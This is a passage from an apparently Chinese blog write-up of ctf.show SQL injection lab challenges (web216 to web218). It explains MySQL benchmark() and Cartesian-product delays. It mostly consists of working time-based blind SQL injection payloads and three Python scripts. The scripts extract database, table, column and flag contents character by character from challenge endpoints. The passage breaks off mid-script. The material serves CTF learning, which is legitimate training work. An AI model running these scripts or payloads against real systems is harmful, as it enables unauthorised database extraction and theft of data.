src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105112503391.png" alt="image-20250105112503391"></p><p>但是发现数据被括号闭合了，即手动闭合前括号，都不用base64加密了</p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105112825270.png" alt="image-20250105112825270"></p><p>测试成功，开始时间盲注</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要手动输入表名，列名</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;1) or if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)#&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;1) or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)#&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;1) or if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)#&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;1) or if(substr((select group_concat(<span class="subst">&#123;column&#125;</span>) from <span class="subst">&#123;table&#125;</span> ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,sleep(4),0)#&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">4</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://5834e11a-e430-4226-9791-6af509fe403a.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">    database=brute_force(url)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105115808709.png" alt="image-20250105115808709"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105115818410.png" alt="image-20250105115818410"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105115824980.png" alt="image-20250105115824980"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105115755225.png" alt="image-20250105115755225"></p><h2 id="web217-过滤sleep函数"><a href="#web217-过滤sleep函数" class="headerlink" title="web217(过滤sleep函数)"></a>web217(过滤sleep函数)</h2><h3 id="补充-benchmark-函数"><a href="#补充-benchmark-函数" class="headerlink" title="补充:benchmark()函数"></a>补充:benchmark()函数</h3><h4 id="作用-1"><a href="#作用-1" class="headerlink" title="作用"></a>作用</h4><p>用于MySQL 数据库，用于测试表达式的执行速度。它重复执行一个表达式指定的次数，并返回执行结果。</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">BENCHMARK(count, expr)</span><br></pre></td></tr></table></figure><ul><li><code>count</code>: 表示要执行表达式的次数。</li><li><code>expr</code>: 要执行的表达式。</li></ul><h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><ol><li><p><strong>测试简单表达式</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> BENCHMARK(<span class="number">1000000</span>, <span class="string">&#x27;a&#x27;</span> <span class="operator">+</span> <span class="string">&#x27;b&#x27;</span>);</span><br></pre></td></tr></table></figure><p>这条语句会将 <code>&#39;a&#39; + &#39;b&#39;</code> 执行 1,000,000 次。由于这是个无效的字符串操作，实际上没有什么实际意义，但可以用来测试性能。</p></li><li><p><strong>测试复杂表达式</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> BENCHMARK(<span class="number">1000000</span>, MD5(<span class="string">&#x27;test&#x27;</span>));</span><br></pre></td></tr></table></figure><p>这条语句会将 MD5(‘test’)执行 1,000,000 次，用于测试哈希函数的性能。</p></li><li><p><strong>结合其他 SQL 查询</strong>：</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> BENCHMARK(<span class="number">1000000</span>, CONCAT(<span class="string">&#x27;Hello&#x27;</span>, <span class="string">&#x27;World&#x27;</span>));</span><br></pre></td></tr></table></figure><p>这条语句会将 <code>CONCAT(&#39;Hello&#39;, &#39;World&#39;)</code> 执行 1,000,000 次，用于测试字符串连接操作的性能。</p></li></ol><hr><h3 id="注入过程-3"><a href="#注入过程-3" class="headerlink" title="注入过程"></a>注入过程</h3><p>进行测试</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">debug<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ip<span class="operator">=</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">99</span>,benchmark(<span class="number">2000000</span>,MD5(<span class="string">&#x27;test&#x27;</span>)),benchmark(<span class="number">5000000</span>,MD5(<span class="string">&#x27;test&#x27;</span>)))</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105131400713.png" alt="image-20250105131400713"></p><p>测试成功，大概100000次就是0.1秒，因此改脚本进行时间盲注(由于benchmark函数第一个数字太大时容易把环境跑崩，所以适当减少秒数)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要手动输入表名，列名，该脚本benchmark次数和响应时间判断要根据网络情况调整，我在2500000和2的时候比较稳定</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,benchmark(2500000,MD5(&#x27;test&#x27;)),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">2</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,benchmark(2500000,MD5(&#x27;test&#x27;)),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">2</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,benchmark(2500000,MD5(&#x27;test&#x27;)),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">2</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force3</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(<span class="subst">&#123;column&#125;</span>) from <span class="subst">&#123;table&#125;</span> ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,benchmark(2500000,MD5(&#x27;test&#x27;)),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">2</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,flag为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># 指定的URL</span></span><br><span class="line">    url = <span class="string">&#x27;http://7c47fda9-eda4-43ed-a634-a6533c2ea0b9.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">    database=brute_force(url)</span><br><span class="line">    brute_force1(url)</span><br><span class="line">    table=<span class="built_in">input</span>(<span class="string">&quot;请输入表名:&quot;</span>)</span><br><span class="line">    brute_force2(url)</span><br><span class="line">    column=<span class="built_in">input</span>(<span class="string">&quot;请输入列名:&quot;</span>)</span><br><span class="line">    brute_force3(url)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105132059788.png" alt="image-20250105132059788"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105132647764.png" alt="image-20250105132647764"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105132654302.png" alt="image-20250105132654302"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105134742293.png" alt="image-20250105134742293"></p><h2 id="web218-benchmark"><a href="#web218-benchmark" class="headerlink" title="web218(+benchmark)"></a>web218(+benchmark)</h2><h3 id="补充-笛卡儿积"><a href="#补充-笛卡儿积" class="headerlink" title="补充:笛卡儿积"></a>补充:笛卡儿积</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>在数学和数据库领域，笛卡尔积是指两个集合A和B的所有可能组合形成的集合。例如，如果A &#x3D; {1, 2} 和 B &#x3D; {a, b}，那么A和B的笛卡尔积是 {(1,a), (1,b), (2,a), (2,b)}。在SQL查询中，如果没有指定连接条件，两个表进行连接时会生成笛卡尔积，即每个表中的每一行都与另一个表中的每一行配对。</p><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A, information_schema.columns B)</span><br><span class="line">#将两个information_schema.columns互相连接，注意这两个表列数要相同，如果是tables和columns连接就可能失效</span><br></pre></td></tr></table></figure><hr><h3 id="注入过程-4"><a href="#注入过程-4" class="headerlink" title="注入过程"></a>注入过程</h3><p>该题通过笛卡儿积进行盲注，构造payload测试(不需要再添加一个information_schema.columns C,容易转崩，亲测有效)</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">debug<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>ip<span class="operator">=</span>if(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">99</span>,(<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.columns A, information_schema.columns B),<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105143613557.png" alt="image-20250105143613557"></p><p><img src="/../img/%E5%8D%9A%E5%AE%A2/web%E5%85%A5%E9%97%A8-sql%E6%B3%A8%E5%85%A5/image-20250105143654752.png" alt="image-20250105143654752"></p><blockquote><p>PS:现在才发现这题和上题都有括号，但是和web216不同的是这两个题就相当于子查询语句了，所以不用闭合也能得出结果</p></blockquote><p>通过测试发现不同结果的时间不同，则使用脚本进行时间盲注</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#需要手动输入表名，列名，该脚本的响应时间发生改变，经过测试差不多大于1.5秒合理，应该根据网速合理更改</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr(database(),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">1.5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,库名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> find</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force1</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;<span class="subst">&#123;database&#125;</span>&#x27;),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">1.5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,表名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_force2</span>(<span class="params">url</span>):</span><br><span class="line">    find = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">        found_char = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> string.ascii_letters + string.digits +<span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;,&#x27;</span>+<span class="string">&#x27;-&#x27;</span>:  </span><br><span class="line">            payload = <span class="string">f&quot;if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;<span class="subst">&#123;table&#125;</span>&#x27; ),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;char&#125;</span>&#x27;,(select count(*) from information_schema.columns A, information_schema.columns B),0)&quot;</span></span><br><span class="line">            start_time = time.time()</span><br><span class="line">            response = requests.post(url, data=&#123;<span class="string">&#x27;ip&#x27;</span>: payload, <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span>&#125;)</span><br><span class="line">            elapsed_time = time.time() - start_time</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> elapsed_time &gt;=<span class="number">1.5</span> : </span><br><span class="line">                find += char</span><br><span class="line">                <span class="built_in">print</span>(find)</span><br><span class="line">                found_char = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> found_char:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;未找到更多字符,列名为&quot;</span>+find)</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title 